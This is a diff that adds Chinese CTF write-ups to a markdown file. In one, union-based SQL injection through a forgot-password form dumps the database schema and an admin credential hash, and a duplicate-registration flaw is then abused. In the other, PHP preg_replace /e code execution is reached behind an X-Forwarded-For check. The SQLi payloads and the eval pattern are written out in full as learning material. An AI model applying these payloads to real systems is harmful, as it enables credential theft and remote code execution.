@@ -502,7 +502,131 @@ text=123456&submit=
 
 ![](https://qqx.im/mdimage/adword/get_flag2.png)
 
-\>\>To be continue
+
+
+## ics-04
+
+题目提示
+
+> 工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。
+
+那就直接开始怼登录和注册功能。
+
+有注册登录功能的题目，当然是先试注册功能。
+
+FUZZ了一番发现，没有SQL注入，注册的时候没有检查用户是否存在，所以可以重复注册。所以注册一个admin登录试试。登录成功之后提示
+
+> 普通用户登录成功,没什么用
+
+那看来得找管理员账户，但是又不是admin。测试一下登录功能也没有发现SQL注入。但是还有个忘记密码的功能。
+
+![](https://qqx.im/mdimage/adword/cetc_forget.png)
+
+测试了一波发现有SQL注入，并且没有啥过滤。
+
+在我确定列数之后，在尝试使用
+
+```
+0' union select 1,2,databaser(),4#
+```
+
+发现好像database()函数被禁用了。那怎么办？猜，不太现实。如果还记得爆表和列的库information_schema里面存有库和表的信息，就可以利用这个。
+
+提交
+
+```
+0' union select 1,2,GROUP_CONCAT(DISTINCT TABLE_SCHEMA),4 from information_schema.columns #
+```
+
+返回
+
+```
+information_schema,cetc004,mysql,performance_schema
+```
+
+根据结果返回提交
+
+```
+0' union select 1,2,GROUP_CONCAT(DISTINCT TABLE_NAME),4 from information_schema.columns where table_schema='cetc004' #
+```
+
+返回
+
+```
+user
+```
+
+再提交
+
+```
+0' union select 1,2,GROUP_CONCAT(DISTINCT COLUMN_NAME),4 from information_schema.columns where TABLE_NAME='user' and  table_schema='cetc004'#
+```
+
+返回
+
+```
+username,password,question,answer
+```
+
+管理员用户应该是第一个，直接取应该可以
+
+```
+0' union select 1,2,concat(username,',',password),4 from cetc004.user#
+```
+
+返回
+
+```
+c3tlwDmIn23,2f8667f381ff50ced6a3edc259260ba9
+```
+
+密码查不出，但是可以根据之前提到的，重复注册漏洞，再注册一个c3tlwDmIn23，登录即可拿到flag
+
+扩展一下，如果information_schema被过滤了，如果没有报错回显，似乎就只能爆破了，如果有报错回显，可以参考一下[这篇文章](https://www.secpulse.com/archives/68991.html)
+
+
+
+## cis-05
+
+这题比较简单，主要记录一下
+
+```php
+if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+    echo "<br >Welcome My Admin ! <br >";
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) && isset($replacement) && isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);
+    }else{
+        die();
+    }
+
+}
+```
+
+遇到这种可能存在漏洞的地方且不懂的函数，就去查php.net或者百度，可以看到preg_replace这个函数的pattern参数的/e
+
+>*e* (*PREG_REPLACE_EVAL*)
+>
+>Warning
+>
+>This feature was *DEPRECATED* in PHP 5.5.0, and *REMOVED* as of PHP 7.0.0.
+>
+>如果设置了这个被弃用的修饰符， [preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php) 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行**(eval 函数方式)****，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(*\*)和 NULL 字符在 后向引用替换时会被用反斜线转义.
+
+所以如果是
+
+>preg_replace('/(.*)/e','system("ls")','xxxxx')
+
+就会执行system("ls")
+
+
+
+\>\>**To be continue**
 
 
 
